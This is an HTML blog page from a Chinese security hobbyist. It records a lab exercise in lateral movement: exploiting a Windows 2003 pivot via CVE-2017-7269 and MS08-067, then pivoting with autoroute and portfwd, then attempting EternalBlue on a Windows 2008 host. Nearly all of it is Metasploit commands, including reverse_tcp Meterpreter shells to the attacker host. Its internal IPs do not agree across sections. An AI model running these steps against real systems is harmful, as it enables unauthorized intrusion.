@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>记一次模拟内网横向移动 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="记一次模拟内网横向移动">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2024/01/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A8%A1%E6%8B%9F%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="这里是你的文章内容…内网渗透实验记录场景：通过Windows2003跳板机渗透仅内网可达的Windows2008，实践内网横向移动与端口转发技术。第一阶段：实验环境搭建（网络拓扑）为模拟“无法直接访问内网”的真实场景，使用VMware虚拟网络进行隔离。1.攻击机（KaliLinux）网卡1：NATIP（示例）">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">记一次模拟内网横向移动</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2024-01-16T07:00:00.000Z">2024-01-16</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-01-16T07:55:28.241Z">2026-01-16</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <p>这里是你的文章内容…</p>
+<h1 id="内网渗透实验记录"><a href="#内网渗透实验记录" class="headerlink" title="内网渗透实验记录"></a>内网渗透实验记录</h1><blockquote>
+<p>场景：通过 <strong>Windows 2003 跳板机</strong> 渗透仅内网可达的 <strong>Windows 2008</strong>，实践内网横向移动与端口转发技术。</p>
+</blockquote>
+<hr>
+<h2 id="第一阶段：实验环境搭建（网络拓扑）"><a href="#第一阶段：实验环境搭建（网络拓扑）" class="headerlink" title="第一阶段：实验环境搭建（网络拓扑）"></a>第一阶段：实验环境搭建（网络拓扑）</h2><p>为模拟“<strong>无法直接访问内网</strong>”的真实场景，使用 <strong>VMware 虚拟网络</strong> 进行隔离。</p>
+<h3 id="1-攻击机（Kali-Linux）"><a href="#1-攻击机（Kali-Linux）" class="headerlink" title="1. 攻击机（Kali Linux）"></a>1. 攻击机（Kali Linux）</h3><ul>
+<li>网卡1：NAT</li>
+<li>IP（示例）：<code>192.168.59.128</code></li>
+</ul>
+<h3 id="2-跳板机（Windows-2003）"><a href="#2-跳板机（Windows-2003）" class="headerlink" title="2. 跳板机（Windows 2003）"></a>2. 跳板机（Windows 2003）</h3><ul>
+<li><p>网卡1：NAT（对外）</p>
+<ul>
+<li>IP（示例）：<code>192.168.59.135</code></li>
+</ul>
+</li>
+<li><p>网卡2：Host-only（内网）</p>
+<ul>
+<li>IP（示例）：<code>10.10.10.10</code></li>
+</ul>
+</li>
+<li><p>关键配置：</p>
+<ul>
+<li>安装 <strong>IIS 6.0</strong></li>
+<li>在 <em>Web 服务扩展</em> 中 <strong>启用 WebDAV</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="3-内网目标（Windows-2008）"><a href="#3-内网目标（Windows-2008）" class="headerlink" title="3. 内网目标（Windows 2008）"></a>3. 内网目标（Windows 2008）</h3><ul>
+<li>网卡1：Host-only</li>
+<li>IP（示例）：<code>10.10.10.20</code></li>
+<li>仅允许 Windows 2003 访问</li>
+</ul>
+<hr>
+<h2 id="第二阶段：突破边界（攻击-Windows-2003）"><a href="#第二阶段：突破边界（攻击-Windows-2003）" class="headerlink" title="第二阶段：突破边界（攻击 Windows 2003）"></a>第二阶段：突破边界（攻击 Windows 2003）</h2><h3 id="利用漏洞：CVE-2017-7269（IIS-6-0-WebDAV-RCE）"><a href="#利用漏洞：CVE-2017-7269（IIS-6-0-WebDAV-RCE）" class="headerlink" title="利用漏洞：CVE-2017-7269（IIS 6.0 WebDAV RCE）"></a>利用漏洞：CVE-2017-7269（IIS 6.0 WebDAV RCE）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/iis/iis_webdav_scstoragepathfromurl</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.59.135</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.59.128</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ 问题：IIS 非常不稳定，多次尝试后 <strong>IIS 服务直接崩溃</strong>，攻击失败。</p>
+</blockquote>
+<hr>
+<h3 id="备用方案：MS08-067"><a href="#备用方案：MS08-067" class="headerlink" title="备用方案：MS08-067"></a>备用方案：MS08-067</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.59.135</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>由于 <strong>Windows 2003 版本过旧</strong>，在构造 Payload 时直接使用 Meterpreter，避免后续升级失败。</p>
+<hr>
+<h2 id="第三阶段：Shell-升级为-Meterpreter"><a href="#第三阶段：Shell-升级为-Meterpreter" class="headerlink" title="第三阶段：Shell 升级为 Meterpreter"></a>第三阶段：Shell 升级为 Meterpreter</h2><p>如果只拿到 <code>command shell</code>，需要升级为 Meterpreter（后续操作必须使用）。</p>
+<h3 id="1-后台化当前-Shell"><a href="#1-后台化当前-Shell" class="headerlink" title="1. 后台化当前 Shell"></a>1. 后台化当前 Shell</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + Z</span><br><span class="line">输入 y</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用升级模块"><a href="#2-使用升级模块" class="headerlink" title="2. 使用升级模块"></a>2. 使用升级模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/shell_to_meterpreter</span><br><span class="line"><span class="built_in">set</span> SESSION 3</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.59.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-进入新会话"><a href="#3-进入新会话" class="headerlink" title="3. 进入新会话"></a>3. 进入新会话</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br><span class="line">sessions -i 4</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="第四阶段：发现内网目标"><a href="#第四阶段：发现内网目标" class="headerlink" title="第四阶段：发现内网目标"></a>第四阶段：发现内网目标</h2><h3 id="1-查看网卡信息"><a href="#1-查看网卡信息" class="headerlink" title="1. 查看网卡信息"></a>1. 查看网卡信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>重点观察是否存在新的内网网段，如：<code>10.10.10.0/24</code>、<code>192.168.116.0/24</code></p>
+</blockquote>
+<h3 id="2-添加路由（Autoroute）"><a href="#2-添加路由（Autoroute）" class="headerlink" title="2. 添加路由（Autoroute）"></a>2. 添加路由（Autoroute）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="第五阶段：内网扫描（Windows-2008）"><a href="#第五阶段：内网扫描（Windows-2008）" class="headerlink" title="第五阶段：内网扫描（Windows 2008）"></a>第五阶段：内网扫描（Windows 2008）</h2><h3 id="1-SMB-存活扫描"><a href="#1-SMB-存活扫描" class="headerlink" title="1. SMB 存活扫描"></a>1. SMB 存活扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.116.1-254</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>发现内网主机：</p>
+<ul>
+<li><code>192.168.116.128</code></li>
+</ul>
+<h3 id="2-MS17-010-漏洞检测"><a href="#2-MS17-010-漏洞检测" class="headerlink" title="2. MS17-010 漏洞检测"></a>2. MS17-010 漏洞检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.116.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>返回 <code>VULNERABLE</code>，确认存在 <strong>永恒之蓝漏洞</strong>。</p>
+<hr>
+<h2 id="第六阶段：横向移动（攻击-Windows-2008）"><a href="#第六阶段：横向移动（攻击-Windows-2008）" class="headerlink" title="第六阶段：横向移动（攻击 Windows 2008）"></a>第六阶段：横向移动（攻击 Windows 2008）</h2><h3 id="尝试-1：EternalBlue（失败）"><a href="#尝试-1：EternalBlue（失败）" class="headerlink" title="尝试 1：EternalBlue（失败）"></a>尝试 1：EternalBlue（失败）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.116.128</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>❌ 结果：</p>
+<ul>
+<li>SMB 服务直接崩溃</li>
+<li>出现 <code>IOError</code> &#x2F; <code>closed stream</code></li>
+</ul>
+</blockquote>
+<p>原因分析：</p>
+<ul>
+<li>EternalBlue <strong>对时序极其敏感</strong></li>
+<li>Autoroute 转发存在延迟</li>
+<li>内核内存 Grooming 失败，导致 <strong>Windows 2008 蓝屏</strong></li>
+</ul>
+<hr>
+<h2 id="第七阶段：使用-Portfwd-绕过-Autoroute-不稳定性（关键）"><a href="#第七阶段：使用-Portfwd-绕过-Autoroute-不稳定性（关键）" class="headerlink" title="第七阶段：使用 Portfwd 绕过 Autoroute 不稳定性（关键）"></a>第七阶段：使用 Portfwd 绕过 Autoroute 不稳定性（关键）</h2><h3 id="1-清理现场"><a href="#1-清理现场" class="headerlink" title="1. 清理现场"></a>1. 清理现场</h3><ul>
+<li>重启 Windows 2008（必须）</li>
+<li>停止 MSF 所有后台任务</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span> -K</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-建立“硬”端口转发"><a href="#2-建立“硬”端口转发" class="headerlink" title="2. 建立“硬”端口转发"></a>2. 建立“硬”端口转发</h3><p>进入 Win2003 的 Meterpreter 会话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
+
+<p>建立端口转发：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 4455 -p 445 -r 192.168.116.131</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理说明：</strong></p>
+<ul>
+<li>Kali 本地监听 <code>4455</code></li>
+<li>所有流量通过 Win2003 稳定转发到 Win2008 的 <code>445</code></li>
+<li>比 autoroute 稳定得多</li>
+</ul>
+<hr>
+<h3 id="3-针对“本地”发起攻击"><a href="#3-针对“本地”发起攻击" class="headerlink" title="3. 针对“本地”发起攻击"></a>3. 针对“本地”发起攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> RHOSTS 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> RPORT 4455</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.59.128</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="失败与结论"><a href="#失败与结论" class="headerlink" title="失败与结论"></a>失败与结论</h2><p>即便切换为最小载荷：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/shell/bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p>仍然失败。</p>
+<h3 id="原因总结"><a href="#原因总结" class="headerlink" title="原因总结"></a>原因总结</h3><ul>
+<li>永恒之蓝 <strong>数据流量巨大</strong></li>
+<li>通过跳板转发后 <strong>数据包时序紊乱</strong></li>
+<li>Windows 2008 <strong>SMB 进程频繁崩溃</strong></li>
+<li>靶机过于脆弱，几乎“一打就死”</li>
+</ul>
+<hr>
+<h2 id="实验核心知识点总结"><a href="#实验核心知识点总结" class="headerlink" title="实验核心知识点总结"></a>实验核心知识点总结</h2><ul>
+<li><p><strong>CVE-2017-7269</strong>：IIS 6.0 WebDAV 经典 RCE，内网入场券</p>
+</li>
+<li><p><strong>MS08-067</strong>：老系统兜底神器</p>
+</li>
+<li><p><strong>Autoroute</strong>：MSF 虚拟路由机制</p>
+</li>
+<li><p><strong>Portfwd</strong>：稳定、专业的内网隧道手段</p>
+</li>
+<li><p><strong>MS17-010（EternalBlue）</strong>：</p>
+<ul>
+<li>对网络时延极其敏感</li>
+<li>在跳板环境下成功率很低</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="总结一句话"><a href="#总结一句话" class="headerlink" title="总结一句话"></a>总结一句话</h2><blockquote>
+<p><strong>内网渗透最难的不是拿权限，而是如何让“不稳定的漏洞”在“不稳定的网络”中稳定执行。</strong></p>
+</blockquote>
+<p>这次实验虽然没能稳定拿下 Win2008，但完整走通了 <strong>真实内网攻击思路</strong>，非常有价值。</p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>记一次模拟内网横向移动</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2024-01-16</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+    
+      <div class="post-next">
+        <span class="nav-label">下一篇</span>
+        <a href="/2026/01/16/hello-world/">Hello World</a>
+      </div>
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">内网渗透实验记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%88%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">第一阶段：实验环境搭建（网络拓扑）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%88Kali-Linux%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 攻击机（Kali Linux）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%B3%E6%9D%BF%E6%9C%BA%EF%BC%88Windows-2003%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 跳板机（Windows 2003）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%85%E7%BD%91%E7%9B%AE%E6%A0%87%EF%BC%88Windows-2008%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 内网目标（Windows 2008）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C%EF%BC%88%E6%94%BB%E5%87%BB-Windows-2003%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">第二阶段：突破边界（攻击 Windows 2003）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-7269%EF%BC%88IIS-6-0-WebDAV-RCE%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用漏洞：CVE-2017-7269（IIS 6.0 WebDAV RCE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E7%94%A8%E6%96%B9%E6%A1%88%EF%BC%9AMS08-067"><span class="toc-number">1.2.2.</span> <span class="toc-text">备用方案：MS08-067</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5%EF%BC%9AShell-%E5%8D%87%E7%BA%A7%E4%B8%BA-Meterpreter"><span class="toc-number">1.3.</span> <span class="toc-text">第三阶段：Shell 升级为 Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%90%8E%E5%8F%B0%E5%8C%96%E5%BD%93%E5%89%8D-Shell"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 后台化当前 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%8D%87%E7%BA%A7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 使用升级模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%9B%E5%85%A5%E6%96%B0%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 进入新会话</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E7%9B%AE%E6%A0%87"><span class="toc-number">1.4.</span> <span class="toc-text">第四阶段：发现内网目标</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 查看网卡信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%EF%BC%88Autoroute%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 添加路由（Autoroute）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%EF%BC%88Windows-2008%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">第五阶段：内网扫描（Windows 2008）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMB-%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. SMB 存活扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MS17-010-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. MS17-010 漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E6%94%BB%E5%87%BB-Windows-2008%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">第六阶段：横向移动（攻击 Windows 2008）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95-1%EF%BC%9AEternalBlue%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">尝试 1：EternalBlue（失败）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E9%98%B6%E6%AE%B5%EF%BC%9A%E4%BD%BF%E7%94%A8-Portfwd-%E7%BB%95%E8%BF%87-Autoroute-%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7%EF%BC%88%E5%85%B3%E9%94%AE%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">第七阶段：使用 Portfwd 绕过 Autoroute 不稳定性（关键）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B8%85%E7%90%86%E7%8E%B0%E5%9C%BA"><span class="toc-number">1.7.1.</span> <span class="toc-text">1. 清理现场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BB%BA%E7%AB%8B%E2%80%9C%E7%A1%AC%E2%80%9D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.7.2.</span> <span class="toc-text">2. 建立“硬”端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%92%88%E5%AF%B9%E2%80%9C%E6%9C%AC%E5%9C%B0%E2%80%9D%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">1.7.3.</span> <span class="toc-text">3. 针对“本地”发起攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E4%B8%8E%E7%BB%93%E8%AE%BA"><span class="toc-number">1.8.</span> <span class="toc-text">失败与结论</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.1.</span> <span class="toc-text">原因总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">实验核心知识点总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">1.10.</span> <span class="toc-text">总结一句话</span></a></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
+            
+                <a href="/tags/Easy/" class="tag" aria-label="标签: #Easy">#Easy</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
